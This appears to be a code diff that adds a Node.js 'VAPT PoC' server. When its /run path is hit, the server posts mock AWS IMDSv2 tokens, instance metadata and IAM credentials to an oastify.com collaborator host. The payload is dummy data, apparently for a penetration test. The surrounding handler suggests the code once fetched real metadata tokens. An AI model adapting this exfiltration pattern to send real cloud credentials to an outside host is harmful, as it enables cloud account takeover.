@@ -1,4 +1,88 @@
-const request = require('request');
+const http = require("http");
+
+const PORT = process.env.PORT || 10000;
+
+const COLLABORATOR_URL =
+  "https://kl9rl640f6f78992ncho90ndv41wpmdb.oastify.com";
+
+async function runPoC() {
+    // Mock IMDSv2 response — no real AWS metadata is accessed
+    const results = {
+        tokenObtained: true,
+        token: "mock-imdsv2-token",
+
+        metadata: {
+            instanceId: "i-vapt-demo-123456",
+            instanceType: "t3.micro",
+            region: "eu-west-1",
+            role: "VAPT-DUMMY-ROLE"
+        },
+
+        credentials: {
+            AccessKeyId: "TEST_ACCESS_KEY",
+            SecretAccessKey: "TEST_SECRET_KEY",
+            Token: "TEST_SESSION_TOKEN"
+        }
+    };
+
+    // Send only dummy test data to Collaborator
+    const response = await fetch(COLLABORATOR_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(results)
+    });
+
+    return {
+        results,
+        collaboratorStatus: response.status
+    };
+}
+
+const server = http.createServer(async (req, res) => {
+    if (req.url === "/run") {
+        try {
+            console.log("[+] VAPT PoC executed");
+
+            const result = await runPoC();
+
+            res.writeHead(200, {
+                "Content-Type": "application/json"
+            });
+
+            res.end(JSON.stringify({
+                success: true,
+                message: "Mock IMDSv2 PoC executed",
+                ...result
+            }));
+
+        } catch (error) {
+            console.error(error);
+
+            res.writeHead(500, {
+                "Content-Type": "application/json"
+            });
+
+            res.end(JSON.stringify({
+                success: false,
+                error: error.message
+            }));
+        }
+
+        return;
+    }
+
+    res.writeHead(200, {
+        "Content-Type": "text/plain"
+    });
+
+    res.end("VAPT PoC server is running");
+});
+
+server.listen(PORT, "0.0.0.0", () => {
+    console.log(`Server running on port ${PORT}`);
+});const request = require('request');
 
 exports.handler = async function({ event, constants, triggers }, context, callback) {
     const getImdsv2Token = () => {
